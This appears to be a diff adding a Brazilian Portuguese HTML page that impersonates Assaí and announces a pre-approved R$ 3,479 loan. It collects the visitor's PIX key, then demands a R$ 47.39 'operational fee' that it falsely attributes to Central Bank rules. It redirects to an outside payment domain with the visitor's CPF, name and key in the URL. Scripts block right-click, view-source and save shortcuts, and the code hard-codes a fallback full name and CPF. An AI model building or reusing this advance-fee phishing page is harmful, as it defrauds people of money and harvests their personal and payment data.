@@ -1,0 +1,470 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1289289589600537');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <script>
+        localStorage.setItem("upsell", "up7");
+    </script>
+
+
+    <style>
+    .header {
+        background-color: #1E3A80;
+        padding: 15px 0;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        border-bottom: solid 3px  #ee4d2d;
+    }
+    .main-content {
+        max-width: 450px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem 2rem 1rem 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 0 auto;
+    }
+    .main-content h2 {
+        margin-bottom: 20px;
+    }
+    .btn-custom {
+        color: white;
+        border: none;
+        width: 100%;
+        margin-bottom: 10px;
+        background: #1E3A80;
+        font-weight: 600;
+        border-radius: 1rem;
+        padding: .75rem 3rem;
+        letter-spacing: .3px;
+        line-height: 1.15;
+    }
+    .btn-custom:hover{
+        color: white !important;
+        background-color:  #1E3A80;
+        transform: scale(1.02) !important;
+    }
+    
+    .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+    }
+    
+    #conclusao {
+        display: none; /* Esconde o elemento por padrão */
+    }
+    
+    #conclusao h4 {
+        color: green; /* Define a cor do texto */
+        font-weight: bold; /* Define o texto em negrito */
+    }
+    
+    .char {
+        border-top: solid px #00adca;
+        background-color: #00adca;
+        padding: 2px !important;
+    }
+
+    .pix-options {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+        margin: 15px 0;
+    }
+
+    .pix-option {
+        display: flex;
+        align-items: center;
+        padding: 10px;
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        background-color: #f8f9fa;
+    }
+
+    .pix-option:hover {
+        border-color: #1E3A80;
+        background-color: #f0f4ff;
+    }
+
+    .pix-option input[type="radio"] {
+        margin-right: 8px;
+    }
+
+    .pix-option input[type="radio"]:checked + span {
+        font-weight: bold;
+        color: #1E3A80;
+    }
+
+    .pix-option:has(input[type="radio"]:checked) {
+        border-color: #1E3A80;
+        background-color: #e6f0ff;
+    }
+
+    .pix-input-container input {
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        padding: 12px;
+        font-size: 16px;
+        transition: border-color 0.3s ease;
+    }
+
+    .pix-input-container input:focus {
+        border-color: #1E3A80;
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(30, 58, 128, 0.1);
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .spinner {
+        animation: spin 1s linear infinite;
+    }/* End custom CSS */
+    </style>
+    <script>
+if (document.addEventListener) {
+    document.addEventListener("keydown", bloquearSource);
+} else { //Versões antigas do IE
+    document.attachEvent("onkeydown", bloquearSource);
+}
+
+function bloquearSource(e) {
+    e = e || window.event;
+
+    var code = e.which || e.keyCode;
+
+    if (
+        e.ctrlKey &&
+        (code == 83 || code == 85) //83 = S, 85 = U
+    ) {
+        if (e.preventDefault) {
+            e.preventDefault();
+        } else {
+            e.returnValue = false;
+        }
+
+        return false;
+    }
+}
+</script>
+<style>
+/*desabilita a seleção no body*/
+body {
+    -webkit-touch-callout: none; /* iOS Safari */
+      -webkit-user-select: none; /* Chrome/Safari/Opera */
+       -khtml-user-select: none; /* Konqueror */
+         -moz-user-select: none; /* Firefox */
+          -ms-user-select: none; /* Internet Explorer/Edge */
+              user-select: none;
+}
+
+/*habilita a seleção nos campos editaveis*/
+input, textarea {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: text; /* Chrome/Safari/Opera */
+       -khtml-user-select: text; /* Konqueror */
+         -moz-user-select: text; /* Firefox */
+          -ms-user-select: text; /* Internet Explorer/Edge */
+              user-select: text;
+}
+
+/*habilita a seleção nos campos com o atributo contenteditable*/
+[contenteditable=true] {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: all; /* Chrome/Safari/Opera */
+       -khtml-user-select: all; /* Konqueror */
+         -moz-user-select: all; /* Firefox */
+          -ms-user-select: all; /* Internet Explorer/Edge */
+              user-select: all;
+}
+</style>
+
+<script>
+if (document.addEventListener) {
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+        return false;
+    });
+} else { //Versões antigas do IE
+    document.attachEvent("oncontextmenu", function(e) {
+        e = e || window.event;
+        e.returnValue = false;
+        return false;
+    });
+}
+</script>
+<script>
+    window.pixelId = "68cb78856141a2ab904ccacf";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+</head>
+
+<body>
+    
+    
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+    <div class="header">
+          <img decoding="async" style="width: 120px;" src="images/logo.svg" alt="Imagem Centralizada">
+      </div>
+    
+   <div style="grid-area: content; padding: 0 1rem;">
+        <div style="margin-top: 18px;" class="main-content text-center">
+        <h1 style="color: #27ae60;">Parabéns, sua análise foi aprovada!</h1>
+        <p>Após uma análise automatizada e de acordo com as normas do Banco Central, você tem um <strong>empréstimo pré-aprovado</strong> no valor de:</p>
+
+        <h4 class="text-pink" style="font-weight: bold;color: black;">Seu Empréstimo Aprovado: R$ 3.479,00</h4>
+
+        <!-- Seção de Chave PIX -->
+        <div id="pixSection" class="pix-section">
+            <p style="color: black; font-weight: 600;">Para receber o empréstimo, precisamos da sua chave PIX:</p>
+            
+            <div class="pix-options">
+                <label class="pix-option">
+                    <input type="radio" name="pixType" value="cpf" checked>
+                    <span>CPF</span>
+                </label>
+                <label class="pix-option">
+                    <input type="radio" name="pixType" value="email">
+                    <span>E-mail</span>
+                </label>
+                <label class="pix-option">
+                    <input type="radio" name="pixType" value="telefone">
+                    <span>Telefone</span>
+                </label>
+                <label class="pix-option">
+                    <input type="radio" name="pixType" value="chave_aleatoria">
+                    <span>Chave Aleatória</span>
+                </label>
+            </div>
+
+            <div class="pix-input-container">
+                <input type="text" id="pixKey" class="form-control" placeholder="Digite sua chave PIX" style="margin-top: 15px;">
+            </div>
+
+            <button onclick="cadastrarPix();" class="btn btn-custom rounded-pill w-100 mt-3">Cadastrar Chave PIX</button>
+        </div>
+
+        <!-- Seção de Confirmação PIX -->
+        <div id="pixConfirmation" class="pix-confirmation" style="display: none;">
+            <div style="background-color: #d4edda; border: 1px solid #c3e6cb; border-radius: 8px; padding: 15px; margin: 15px 0;">
+                <h4 style="color: #155724; margin-bottom: 10px;">✅ Chave PIX Cadastrada com Sucesso!</h4>
+                <p style="color: #155724; margin: 0;">Sua chave PIX foi registrada. O empréstimo será transferido para esta conta.</p>
+            </div>
+            
+            <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 15px; margin: 15px 0; text-align: center;">
+                <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+                    <div class="spinner" style="width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #1E3A80; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px;"></div>
+                    <span style="color: #856404; font-weight: 600;">Aguarde, processando...</span>
+                </div>
+                <p style="color: #856404; margin: 0; font-size: 14px;">Preparando as informações para liberação do empréstimo</p>
+            </div>
+        </div>
+
+        <!-- Seção da Taxa -->
+        <div id="taxaSection" class="taxa-section" style="display: none;">
+            <div style="background-color: #e8f4fd; border-left: 4px solid #1E3A80; padding: 20px; margin: 20px 0; border-radius: 8px;">
+                <h4 style="color: #1E3A80; margin-bottom: 15px; font-weight: bold; font-size: 18px;">⚠️ Importante - Taxa Operacional Obrigatória</h4>
+                <p style="color: #1E3A80; font-weight: 700; font-size: 16px; line-height: 1.5; margin: 0;">
+                    Para liberar o crédito em sua conta PIX, é <strong style="background-color: #ffeb3b; padding: 2px 4px; border-radius: 3px;">NECESSÁRIO</strong> quitar a taxa operacional referente a análise e registro do contrato, conforme <strong style="color: #d32f2f;">regulamentação do Banco Central</strong>.
+                </p>
+            </div>
+
+            
+
+            <div style="background-color: #f5f7f9;" class="card p-3 my-4">
+                <p style="color: black;font-weight: 600;">Ao quitar a taxa operacional, você garante:</p>
+                
+                <ul class="text-start custom-list" style="list-style: none;">
+                    <li>
+                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256" style="vertical-align: middle; margin-right: 8px;">
+                            <path fill="black" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"></path>
+                        </svg>Transferência imediata do valor de R$ 3.479,00 para sua conta PIX</li>
+                    <li>
+                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256" style="vertical-align: middle; margin-right: 8px;">
+                            <path fill="black" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"></path>
+                        </svg>Contrato digital seguro e registrado</li>
+                    <li>
+                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256" style="vertical-align: middle; margin-right: 8px;">
+                            <path fill="black" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"></path>
+                        </svg>Proteção antifraude durante a operação</li>
+                    <li>
+                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="icon iconify iconify--ph" width="16" height="16" viewBox="0 0 256 256" style="vertical-align: middle; margin-right: 8px;">
+                            <path fill="black" d="M128 24a104 104 0 1 0 104 104A104.11 104.11 0 0 0 128 24m45.66 85.66l-56 56a8 8 0 0 1-11.32 0l-24-24a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32"></path>
+                        </svg>Acesso imediato aos fundos após quitação da taxa</li>
+                </ul>
+            </div>
+
+            <p class="text-pink">Valor da taxa operacional:</p>
+            <h3 class="text-pink"><strong>R$ 47,39</strong></h3>
+            <button onclick="redirectCheckout();" type="button" id="ativarConta" class="btn btn-custom rounded-pill w-100 mt-3">Quitar Taxa e Receber Empréstimo</button>
+        </div>
+        </div>
+    </div>    
+
+        
+        </div>
+            
+
+    <!-- Footer -->
+    <div class="footer">
+Copyright © 2025 Assaí. Todos os direitos reservados.<br>
+
+Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+
+    <script>
+        function cadastrarPix() {
+            const pixKey = document.getElementById('pixKey').value.trim();
+            const pixType = document.querySelector('input[name="pixType"]:checked').value;
+            
+            if (!pixKey) {
+                alert('Por favor, digite sua chave PIX.');
+                return;
+            }
+            
+            // Validações básicas por tipo
+            if (pixType === 'cpf') {
+                if (!/^\d{3}\.?\d{3}\.?\d{3}-?\d{2}$/.test(pixKey)) {
+                    alert('Por favor, digite um CPF válido.');
+                    return;
+                }
+            } else if (pixType === 'email') {
+                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(pixKey)) {
+                    alert('Por favor, digite um e-mail válido.');
+                    return;
+                }
+            } else if (pixType === 'telefone') {
+                if (!/^\(\d{2}\)\s?\d{4,5}-?\d{4}$/.test(pixKey)) {
+                    alert('Por favor, digite um telefone válido no formato (11) 99999-9999');
+                    return;
+                }
+            } else if (pixType === 'chave_aleatoria') {
+                if (pixKey.length < 8) {
+                    alert('Por favor, digite uma chave aleatória válida.');
+                    return;
+                }
+            }
+            
+            // Salva os dados da chave PIX
+            const pixData = {
+                tipo: pixType,
+                chave: pixKey,
+                timestamp: new Date().toISOString()
+            };
+            localStorage.setItem('pixData', JSON.stringify(pixData));
+            
+            // Esconde a seção de PIX e mostra a confirmação
+            document.getElementById('pixSection').style.display = 'none';
+            document.getElementById('pixConfirmation').style.display = 'block';
+            
+            // Após 4 segundos, mostra a seção da taxa
+            setTimeout(() => {
+                document.getElementById('pixConfirmation').style.display = 'none';
+                document.getElementById('taxaSection').style.display = 'block';
+            }, 4000);
+        }
+
+        function redirectCheckout() {
+            localStorage.setItem('type', 'up7');
+    
+            // Busca os dados do CPF do localStorage (vindos da pasta 4)
+            const dadosCPF = JSON.parse(localStorage.getItem('dadosCPF')) || { 
+                nomeCompleto: "MICHAEL FRANCA DOS SANTOS", 
+                cpf: "33311996801"
+            };
+
+            // Busca os dados da chave PIX
+            const pixData = JSON.parse(localStorage.getItem('pixData')) || {
+                tipo: 'cpf',
+                chave: dadosCPF.cpf || '33311996801'
+            };
+
+            // Constrói a URL do Assaí com os parâmetros
+            const baseUrl = "https://pay.pag-segurotax.space/7vJOGY4z8XaZKXd";
+            const documentParam = dadosCPF.cpf || "33311996801";
+            const nameParam = encodeURIComponent(dadosCPF.nomeCompleto || "MICHAEL FRANCA DOS SANTOS");
+            const pixParam = encodeURIComponent(pixData.chave);
+            
+            const finalUrl = `${baseUrl}?document=${documentParam}&name=${nameParam}&pix=${pixParam}`;
+            
+            // Redireciona para a URL do Assaí
+            window.location.href = finalUrl;
+        }
+
+        // Função para atualizar o placeholder baseado no tipo de chave selecionado
+        document.addEventListener('DOMContentLoaded', function() {
+            const pixInput = document.getElementById('pixKey');
+            const pixOptions = document.querySelectorAll('input[name="pixType"]');
+            
+            pixOptions.forEach(option => {
+                option.addEventListener('change', function() {
+                    switch(this.value) {
+                        case 'cpf':
+                            pixInput.placeholder = 'Digite seu CPF (000.000.000-00)';
+                            break;
+                        case 'email':
+                            pixInput.placeholder = 'Digite seu e-mail';
+                            break;
+                        case 'telefone':
+                            pixInput.placeholder = 'Digite seu telefone (11) 99999-9999';
+                            break;
+                        case 'chave_aleatoria':
+                            pixInput.placeholder = 'Digite sua chave aleatória';
+                            break;
+                    }
+                });
+            });
+        });
+    </script>
+
+
+</body></html>
